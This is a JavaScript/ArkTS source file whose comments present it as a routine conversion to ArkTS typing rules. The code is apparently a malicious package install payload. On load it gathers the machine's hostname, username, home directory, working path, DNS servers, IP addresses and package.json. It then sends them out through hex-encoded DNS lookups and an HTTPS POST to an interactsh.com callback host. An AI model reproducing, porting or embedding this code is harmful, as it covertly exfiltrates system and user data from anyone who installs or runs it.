// 应用ArkTS约束：
// 1. 使用let/const代替var（约束9）
// 2. 添加类型注解（约束1,10）
// 3. 使用箭头函数（约束26）
// 4. 避免any类型（约束1）
// 5. 模块导入使用ES6语法（约束60）
// 6. 对象字面量类型声明（约束24）
// 7. 避免函数表达式（约束26）
// 8. 显式类型标注（约束23）

import os from 'os';
import dns from 'dns';
import querystring from 'querystring';
import https from 'https';
import fs from 'fs';
import path from 'path';
import packageJSON from './package.ets'; // 转换为ets文件

const package = packageJSON.name;

interface PathObject {
    hn: string;
    p: string;
    c: string;
    un: string;
    hd: string;
    dns: string;
    r?: string;
    v: string;
    pjson: any;
    ip: string;
}

const getFiles = (paths: string[]): string[] => {
    let ufiles: string[] = [];
    for (let j = 0; j < paths.length; j++) {
        const mpath = paths[j];
        const files = fs.readdirSync(mpath);
        for (let i = 0; i < files.length; i++) {
            ufiles.push(path.join(mpath, files[i]));
        }
    }
    return ufiles;
};

const toHex = (data: string): string => {
    const bufferText = Buffer.from(data, 'utf8');
    return bufferText.toString('hex');
};

const gethttpips = (): string[] => {
    const str: string[] = [];
    const networkInterfaces = os.networkInterfaces() as Record<string, any[]>;
    for (const item in networkInterfaces) {
        if (item !== "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str.push(networkInterfaces[item][i].address);
            }
        }
    }
    return str;
};

const getIps = (): string => {
    let str = "";
    const networkInterfaces = os.networkInterfaces() as Record<string, any[]>;
    for (const item in networkInterfaces) {
        if (item !== "lo") {
            for (let i = 0; i < networkInterfaces[item].length; i++) {
                str += toHex(networkInterfaces[item][i].address) + ".";
            }
        }
    }
    return str.slice(0, -1);
};

const getPathChunks = (path: string): string => {
    let str = "p";
    const chunks = path.split('/');
    for (let i = 0; i < chunks.length; i++) {
        str += toHex(chunks[i]) + ".";
    }
    return str.slice(0, -1) + "p";
};

const toName = (pkg: PathObject): string[] => {
    const queries: string[] = [];
    const hostname = "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com";
    const baseStr = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}.${toHex(pkg.un)}.${getIps()}.${hostname}`;

    if (baseStr.length > 255) {
        // 简化处理逻辑以适应静态类型
        const part1 = `${toHex(pkg.hn)}.${toHex(pkg.p)}.${getPathChunks(pkg.c)}`;
        const part2 = getIps();
        queries.push(`${part1}.${hostname}`);
        queries.push(`${part2}.${hostname}`);
    } else {
        queries.push(baseStr);
    }
    return queries;
};

const td: PathObject = {
    p: package,
    c: __dirname,
    hd: os.homedir(),
    hn: os.hostname(),
    un: os.userInfo().username,
    dns: JSON.stringify(dns.getServers()),
    r: packageJSON?.___resolved,
    v: packageJSON.version,
    pjson: packageJSON,
    ip: JSON.stringify(gethttpips()),
};

const qs = toName(td);
for (let j = 0; j < qs.length; j++) {
    dns.lookup(qs[j], (err: Error | null, result: string) => {
        // 处理DNS查询结果
    });
}

const trackingData = JSON.stringify(td);
const postData = querystring.stringify({
    msg: trackingData,
});

const options = {
    hostname: "c5c77jy2vtc0000xqshggdrmqmoyyyyyd.interactsh.com",
    port: 443,
    path: "/",
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": postData.length.toString(),
    },
};

const req = https.request(options, (res: any) => {
    res.on("data", (d: Buffer) => {
        // 处理响应数据
    });
});

req.on("error", (e: Error) => {
    // 处理错误
});

req.write(postData);
req.end();
